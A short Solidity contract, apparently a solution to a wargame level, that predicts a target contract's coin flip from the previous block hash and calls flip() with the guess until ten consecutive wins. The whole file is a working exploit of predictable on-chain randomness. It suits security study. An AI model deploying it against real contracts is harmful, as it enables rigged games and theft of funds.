// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint);
}

contract CoinFlipHack {
    ICoinFlip immutable public CF;
    uint256 immutable FACTOR;

    constructor(address _contract, uint256 _factor) {
        CF = ICoinFlip(_contract);
        FACTOR = _factor;
    }

    function hack() external returns(bool){
        require(CF.consecutiveWins() < 10, "contract already hacked");

        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return CF.flip(side);
    }
}